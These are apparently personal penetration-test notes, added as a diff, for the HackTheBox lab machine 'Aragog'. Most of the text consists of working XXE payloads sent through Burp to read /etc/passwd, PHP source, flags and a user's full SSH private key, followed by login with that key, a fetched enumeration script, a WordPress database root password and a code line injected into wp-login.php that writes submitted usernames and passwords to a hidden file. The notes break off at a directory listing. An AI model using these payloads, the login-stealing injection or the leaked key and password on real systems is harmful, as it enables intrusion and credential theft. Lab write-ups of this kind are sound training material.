@@ -1,0 +1,603 @@
+Machine-Name : Aragog
+IP-Address   : 10.129.46.198
+
+Command-Line: sudo nmap -A 10.129.46.198
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-18 14:58 EST
+    Nmap scan report for 10.129.46.198
+    Host is up (0.061s latency).
+    Not shown: 997 closed ports
+    PORT   STATE SERVICE VERSION
+    21/tcp open  ftp     vsftpd 3.0.3
+    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+    |_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
+    | ftp-syst:
+    |   STAT:
+    | FTP server status:
+    |      Connected to ::ffff:10.10.14.89
+    |      Logged in as ftp
+    |      TYPE: ASCII
+    |      No session bandwidth limit
+    |      Session timeout in seconds is 300
+    |      Control connection is plain text
+    |      Data connections will be plain text
+    |      At session startup, client count was 4
+    |      vsFTPd 3.0.3 - secure, fast, stable
+    |_End of status
+    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
+    |   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
+    |_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
+    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Apache2 Ubuntu Default Page: It works
+
+Command-Line: ftp 10.129.46.198
+ftp: Username: Anonymous
+ftp: Access Granted.
+ftp: ls
+Result: test.txt
+ftp: get test.txt
+Result: 200 OK
+
+Command-Line: cat test.txt
+Result:
+    <details>
+        <subnet_mask>255.255.255.192</subnet_mask>
+        <test></test>
+    </details>
+
+Command-Line: ~/HackingTools/dirsearch$ ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e php,txt,html -f -t 20 -u http://aragog.htb
+Result:
+    [15:18:09] Starting:
+    [15:18:10] 403 -  293B  - /.hta.php
+    [15:18:10] 403 -  293B  - /.hta.txt
+    [15:18:10] 403 -  298B  - /.htaccess.php
+    [15:18:10] 403 -  294B  - /.hta.html
+    [15:18:10] 403 -  290B  - /.hta/
+    [15:18:10] 403 -  299B  - /.htaccess.html
+    [15:18:10] 403 -  298B  - /.htpasswd.php
+    [15:18:10] 403 -  299B  - /.htpasswd.html
+    [15:18:10] 403 -  298B  - /.htpasswd.txt
+    [15:19:17] 200 -   46B  - /hosts.php
+    [15:19:18] 403 -  291B  - /icons/
+    [15:19:19] 200 -   11KB - /index.html
+    [15:20:13] 403 -  298B  - /server-status
+    [15:20:13] 403 -  299B  - /server-status/
+
+    Task Completed
+
+
+Browser: http://aragog.htb/hosts.php
+Result:
+    "There are 4294967294 possible hosts for "
+
+Burpsuite: Intercept On.
+Browser: -Refreshed Page-
+Burpsuite: Send to Repeater
+Burpsuite: In Repeater, changed "GET" request to "POST". Appended the contents from test.txt, then clicked "Send".
+Result:
+    HTTP/1.1 200 OK
+    Date: Thu, 19 Nov 2020 06:09:34 GMT
+    Server: Apache/2.4.18 (Ubuntu)
+    Content-Length: 53
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+
+    There are 62 possible hosts for 255.255.255.192
+Burpsuite-Request: (Repeater)
+    POST /hosts.php HTTP/1.1
+    Host: 10.129.46.198
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+    Content-Length: 176
+    <!--?xml version="1.0" ?-->
+    <!DOCTYPE replace [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+    <details>
+        <subnet_mask>&example;</subnet_mask>
+        <test></test>
+    </details>
+  Burpsuite-Response: (Repeater)
+    HTTP/1.1 200 OK
+    Date: Sun, 22 Nov 2020 20:25:37 GMT
+    Server: Apache/2.4.18 (Ubuntu)
+    Vary: Accept-Encoding
+    Content-Length: 2487
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+    There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+    syslog:x:104:108::/home/syslog:/bin/false
+    _apt:x:105:65534::/nonexistent:/bin/false
+    messagebus:x:106:110::/var/run/dbus:/bin/false
+    uuidd:x:107:111::/run/uuidd:/bin/false
+    lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+    whoopsie:x:109:117::/nonexistent:/bin/false
+    avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+    avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+    dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+    colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+    speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+    hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+    kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+    pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+    rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+    saned:x:119:127::/var/lib/saned:/bin/false
+    usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+    florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
+    cliff:x:1001:1001::/home/cliff:/bin/bash
+    mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+    sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+    ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false
+
+Possible Usernames: florian, cliff
+DB: MySQL
+
+Burpsuite-Request: (Repeater)
+    POST /hosts.php HTTP/1.1
+    Host: 10.129.46.198
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+    Content-Length: 220
+
+
+    <!--?xml version="1.0" ?-->
+    <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/hosts.php"> ]>
+    <details>
+        <subnet_mask>&example;</subnet_mask>
+        <test></test>
+    </details>
+Burpsuite-Response: (Repeater)
+    HTTP/1.1 200 OK
+    Date: Sun, 22 Nov 2020 21:09:10 GMT
+    Server: Apache/2.4.18 (Ubuntu)
+    Vary: Accept-Encoding
+    Content-Length: 966
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+
+    There are 4294967294 possible hosts for PD9waHAKIAogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwogICAgJHhtbGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKICAgICRkZXRhaWxzID0gc2ltcGxleG1sX2ltcG9ydF9kb20oJGRvbSk7CiAgICAkbWFzayA9ICRkZXRhaWxzLT5zdWJuZXRfbWFzazsKICAgIC8vZWNobyAiXHJcbllvdSBoYXZlIHByb3ZpZGVkIHN1Ym5ldCAkbWFza1xyXG4iOwoKICAgICRtYXhfYml0cyA9ICczMic7CiAgICAkY2lkciA9IG1hc2syY2lkcigkbWFzayk7CiAgICAkYml0cyA9ICRtYXhfYml0cyAtICRjaWRyOwogICAgJGhvc3RzID0gcG93KDIsJGJpdHMpOwogICAgZWNobyAiXHJcblRoZXJlIGFyZSAiIC4gKCRob3N0cyAtIDIpIC4gIiBwb3NzaWJsZSBob3N0cyBmb3IgJG1hc2tcclxuXHJcbiI7CgogICAgZnVuY3Rpb24gbWFzazJjaWRyKCRtYXNrKXsgIAogICAgICAgICAkbG9uZyA9IGlwMmxvbmcoJG1hc2spOyAgCiAgICAgICAgICRiYXNlID0gaXAybG9uZygnMjU1LjI1NS4yNTUuMjU1Jyk7ICAKICAgICAgICAgcmV0dXJuIDMyLWxvZygoJGxvbmcgXiAkYmFzZSkrMSwyKTsgICAgICAgCiAgICB9Cgo/Pgo=
+
+
+Command-Line:
+echo -n PD9waHAKIAogICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwogICAgJHhtbGZpbGUgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKICAgICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICAgICRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKICAgICRkZXRhaWxzID0gc2ltcGxleG1sX2ltcG9ydF9kb20oJGRvbSk7CiAgICAkbWFzayA9ICRkZXRhaWxzLT5zdWJuZXRfbWFzazsKICAgIC8vZWNobyAiXHJcbllvdSBoYXZlIHByb3ZpZGVkIHN1Ym5ldCAkbWFza1xyXG4iOwoKICAgICRtYXhfYml0cyA9ICczMic7CiAgICAkY2lkciA9IG1hc2syY2lkcigkbWFzayk7CiAgICAkYml0cyA9ICRtYXhfYml0cyAtICRjaWRyOwogICAgJGhvc3RzID0gcG93KDIsJGJpdHMpOwogICAgZWNobyAiXHJcblRoZXJlIGFyZSAiIC4gKCRob3N0cyAtIDIpIC4gIiBwb3NzaWJsZSBob3N0cyBmb3IgJG1hc2tcclxuXHJcbiI7CgogICAgZnVuY3Rpb24gbWFzazJjaWRyKCRtYXNrKXsgIAogICAgICAgICAkbG9uZyA9IGlwMmxvbmcoJG1hc2spOyAgCiAgICAgICAgICRiYXNlID0gaXAybG9uZygnMjU1LjI1NS4yNTUuMjU1Jyk7ICAKICAgICAgICAgcmV0dXJuIDMyLWxvZygoJGxvbmcgXiAkYmFzZSkrMSwyKTsgICAgICAgCiAgICB9Cgo/Pgo= | base64 -d
+
+Result:
+    <?php
+
+        libxml_disable_entity_loader (false);
+        $xmlfile = file_get_contents('php://input');
+        $dom = new DOMDocument();
+        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+        $details = simplexml_import_dom($dom);
+        $mask = $details->subnet_mask;
+        //echo "\r\nYou have provided subnet $mask\r\n";
+
+        $max_bits = '32';
+        $cidr = mask2cidr($mask);
+        $bits = $max_bits - $cidr;
+        $hosts = pow(2,$bits);
+        echo "\r\nThere are " . ($hosts - 2) . " possible hosts for $mask\r\n\r\n";
+
+        function mask2cidr($mask){
+             $long = ip2long($mask);
+             $base = ip2long('255.255.255.255');
+             return 32-log(($long ^ $base)+1,2);
+        }
+
+    ?>
+Notes: File accepts DTD file loading.
+
+Burpsuite-Request: (Repeater)
+    POST /hosts.php HTTP/1.1
+    Host: 10.129.46.198
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+    Content-Length: 187
+
+
+    <!--?xml version="1.0" ?-->
+    <!DOCTYPE replace [<!ENTITY example SYSTEM "/home/florian/user.txt"> ]>
+    <details>
+        <subnet_mask>&example;</subnet_mask>
+        <test></test>
+    </details>
+Burpsuite-Response: (Repeater)
+    HTTP/1.1 200 OK
+    Date: Sun, 22 Nov 2020 20:46:23 GMT
+    Server: Apache/2.4.18 (Ubuntu)
+    Vary: Accept-Encoding
+    Content-Length: 79
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+
+    There are 4294967294 possible hosts for f43bdfbcfd3f2a955a7b67c7a6e21359
+
+*** USER OWNED ***
+
+Burpsuite-Request: (Repeater)
+    POST /hosts.php HTTP/1.1
+    Host: 10.129.46.198
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+    Content-Length: 213
+
+
+        <!--?xml version="1.0" ?-->
+        <!DOCTYPE replace [<!ENTITY example SYSTEM "/home/florian/.ssh/id_rsa"> ]>
+        <details>
+            <subnet_mask>&example;</subnet_mask>
+            <test></test>
+        </details>
+
+Burpsuite-Response: (Repeater)
+    HTTP/1.1 200 OK
+    Date: Mon, 23 Nov 2020 02:05:11 GMT
+    Server: Apache/2.4.18 (Ubuntu)
+    Vary: Accept-Encoding
+    Content-Length: 1725
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+
+    There are 4294967294 possible hosts for
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+    +YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
+    lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
+    1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
+    Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
+    d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
+    AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
+    TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
+    9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
+    /oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
+    0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
+    sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
+    Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
+    zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
+    rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
+    tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
+    HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
+    I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
+    ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
+    HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
+    kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
+    4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
+    7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
+    daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
+    uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
+    -----END RSA PRIVATE KEY-----
+
+Attempting root access...
+
+Burpsuite-Request: (Repeater)
+    GET /hosts.php HTTP/1.1
+    Host: 10.129.46.198
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Cache-Control: max-age=0
+    Content-Length: 179
+
+
+    <!--?xml version="1.0" ?-->
+    <!DOCTYPE replace [<!ENTITY example SYSTEM "/root/root.txt"> ]>
+    <details>
+        <subnet_mask>&example;</subnet_mask>
+        <test></test>
+    </details>
+Burpsuit-Response: (Repeater)
+    HTTP/1.1 200 OK
+    Date: Sun, 22 Nov 2020 20:53:16 GMT
+    Server: Apache/2.4.18 (Ubuntu)
+    Content-Length: 46
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+
+    There are 4294967294 possible hosts for
+    ** ACCESS DENIED **
+
+Command-Line: nano florian.ssh
+File-Contents:
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+    +YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
+    lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
+    1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
+    Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
+    d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
+    AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
+    TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
+    9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
+    /oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
+    0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
+    sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
+    Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
+    zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
+    rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
+    tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
+    HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
+    I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
+    ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
+    HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
+    kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
+    4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
+    7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
+    daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
+    uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
+    -----END RSA PRIVATE KEY-----
+
+Command-Line: chmod 600 florian.ssh
+Command-Line: ssh -i florian.ssh florian@10.129.46.198
+Target-Shell: florian@aragog:~$
+Status: Access Granted.
+
+florian@aragog:~$ sudo -l
+Result:
+    Access Denied.
+
+Command-Line: cd ~/HackingTools/LinEnum$
+Command-Line: sudo python3 -m http.server --bind 10.10.14.87 80
+Result:
+    Serving HTTP on 10.10.14.87 port 80 (http://10.10.14.87:80/) ...
+
+
+Notes: Downloading LinEnum.sh to ~/HackingTools.
+URL: https://github.com/rebootuser/LinEnum
+
+florian@aragog:~$ wget 10.10.14.87/LinEnum.sh
+Result:
+    --2020-11-22 18:53:08--  http://10.10.14.87/LinEnum.sh
+    Connecting to 10.10.14.87:80... connected.
+    HTTP request sent, awaiting response... 200 OK
+    Length: 46631 (46K) [text/x-sh]
+    Saving to: ‘LinEnum.sh’
+
+    LinEnum.sh                 100%[======================================>]  45.54K   286KB/s    in 0.2s
+
+    2020-11-22 18:53:09 (286 KB/s) - ‘LinEnum.sh’ saved [46631/46631]
+
+
+florian@aragog:/var/www/html/dev_wiki$ more -50 wp-config.php
+Result:
+    <?php
+    /**
+     * The base configuration for WordPress
+     *
+     * The wp-config.php creation script uses this file during the
+     * installation. You don't have to use the web site, you can
+     * copy this file to "wp-config.php" and fill in the values.
+     *
+     * This file contains the following configurations:
+     *
+     * * MySQL settings
+     * * Secret keys
+     * * Database table prefix
+     * * ABSPATH
+     *
+     * @link https://codex.wordpress.org/Editing_wp-config.php
+     *
+     * @package WordPress
+     */
+
+    // ** MySQL settings - You can get this info from your web host ** //
+    /** The name of the database for WordPress */
+    define('DB_NAME', 'wp_wiki');
+
+    /** MySQL database username */
+    define('DB_USER', 'root');
+
+    /** MySQL database password */
+    define('DB_PASSWORD', '$@y6CHJ^$#5c37j$#6h');
+
+    /** MySQL hostname */
+    define('DB_HOST', 'localhost');
+
+    /** Database Charset to use in creating database tables. */
+    define('DB_CHARSET', 'utf8');
+
+    /** The Database Collate type. Don't change this if in doubt. */
+    define('DB_COLLATE', '');
+
+    /**#@+
+     * Authentication Unique Keys and Salts.
+     *
+     * Change these to different unique phrases!
+     * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org se
+    cret-key service}
+     * You can change these at any point in time to invalidate all existing cookies. This will force all users
+     to have to log in again.
+     *
+     * @since 2.6.0
+     */
+    define('AUTH_KEY',         'put your unique phrase here');
+    define('SECURE_AUTH_KEY',  'put your unique phrase here');
+    define('LOGGED_IN_KEY',    'put your unique phrase here');
+    define('NONCE_KEY',        'put your unique phrase here');
+    define('AUTH_SALT',        'put your unique phrase here');
+    define('SECURE_AUTH_SALT', 'put your unique phrase here');
+    define('LOGGED_IN_SALT',   'put your unique phrase here');
+    define('NONCE_SALT',       'put your unique phrase here');
+
+    /**#@-*/
+
+    /**
+     * WordPress Database Table prefix.
+     *
+     * You can have multiple installations in one database if you give each
+     * a unique prefix. Only numbers, letters, and underscores please!
+     */
+    $table_prefix  = 'wp_';
+
+    /**
+     * For developers: WordPress debugging mode.
+     *
+     * Change this to true to enable the display of notices during development.
+     * It is strongly recommended that plugin and theme developers use WP_DEBUG
+     * in their development environments.
+     *
+     * For information on other constants that can be used for debugging,
+     * visit the Codex.
+     *
+     * @link https://codex.wordpress.org/Debugging_in_WordPress
+     */
+    define('WP_DEBUG', false);
+
+    /* That's all, stop editing! Happy blogging. */
+
+    /** Absolute path to the WordPress directory. */
+    if ( !defined('ABSPATH') )
+            define('ABSPATH', dirname(__FILE__) . '/');
+
+    /** Sets up WordPress vars and included files. */
+    require_once(ABSPATH . 'wp-settings.php');
+
+Found MySQL DB-Password: $@y6CHJ^$#5c37j$#6h
+florian@aragog:/var/www/html/dev_wiki$ mysql -u root -p
+Result:
+    Enter password:
+    Welcome to the MySQL monitor.  Commands end with ; or \g.
+    Your MySQL connection id is 362
+    Server version: 5.7.20-0ubuntu0.16.04.1 (Ubuntu)
+
+Found Nothing.
+show databases; use `database_name`; show tables; describe `table_name`;
+
+Notes: "florian@aragog:/var/www/html/dev_wiki$" is a cron being updated by zz_backup.
+florian@aragog:/var/www/html/dev_wiki$ cd wp-login.php
+Notes: Under `case 'login'`
+default:
+  file_put_contents(".uk47", $POST['log'] . ":" . $_POST['pwd'] . "\n", FILE_APPEND);
+
+Browser: 10.129.46.198/dev_wiki/wp-admin
+log: uk47
+pwd: rox
+
+Burpsuite-Intercept-On.
+Notes: Sent to Repeater.
+
+Burpsuite-Request: (Repeater)
+    POST /dev_wiki/wp-login.php HTTP/1.1
+    Host: aragog
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 110
+    Origin: http://aragog
+    Connection: close
+    Referer: http://aragog/dev_wiki/wp-login.php?redirect_to=http%3A%2F%2F10.129.46.198%2Fdev_wiki%2Fwp-admin%2F&reauth=1
+    Cookie: wordpress_test_cookie=WP+Cookie+check
+    Upgrade-Insecure-Requests: 1
+
+    log=uk47&pwd=rox&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.129.46.198%2Fdev_wiki%2Fwp-admin%2F&testcookie=1
+
+Burpsuite-Response: (Repeater)
+    HTTP/1.1 200 OK
+    Date: Mon, 23 Nov 2020 04:48:34 GMT
+    Server: Apache/2.4.18 (Ubuntu)
+    Expires: Wed, 11 Jan 1984 05:00:00 GMT
+    Cache-Control: no-cache, must-revalidate, max-age=0
+    Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/dev_wiki/
+    X-Frame-Options: SAMEORIGIN
+    Vary: Accept-Encoding
+    Content-Length: 3213
+    Connection: close
+    Content-Type: text/html; charset=UTF-8
+
+
+florian@aragog:/var/www/html/dev_wiki$ cd ../dev_wiki
+florian@aragog:/var/www/html/dev_wiki$ ls -la
+Result:
+    total 204
+    drwxrwxrwx  5 cliff    cliff     4096 Nov 22 20:42 .
+    drwxrwxrwx  4 www-data www-data  4096 Nov 22 20:40 ..
+    -rwxrwxrwx  1 cliff    cliff      253 Nov 22 20:40 .htaccess
+    -rwxrwxrwx  1 cliff    cliff      418 Nov 22 20:40 index.php
+    -rwxrwxrwx  1 cliff    cliff    19935 Nov 22 20:40 license.txt
+    -rwxrwxrwx  1 cliff    cliff     7413 Nov 22 20:40 readme.html
+
+    -rw-r--r--  1 www-data www-data     5 Nov 22 20:42 .uk47
+
+    -rwxrwxrwx  1 cliff    cliff     5434 Nov 22 20:40 wp-activate.php
+    drwxrwxrwx  9 cliff    cliff     4096 Nov 22 20:40 wp-admin
+    -rwxrwxrwx  1 cliff    cliff      364 Nov 22 20:40 wp-blog-header.php
+    -rwxrwxrwx  1 cliff    cliff     1627 Nov 22 20:40 wp-comments-post.php
+    -rwxrwxrwx  1 cliff    cliff     2839 Nov 22 20:40 wp-config.php
+    drwxrwxrwx  6 cliff    cliff     4096 Nov 22 20:40 wp-content
+    -rwxrwxrwx  1 cliff    cliff     3669 Nov 22 20:40 wp-cron.php
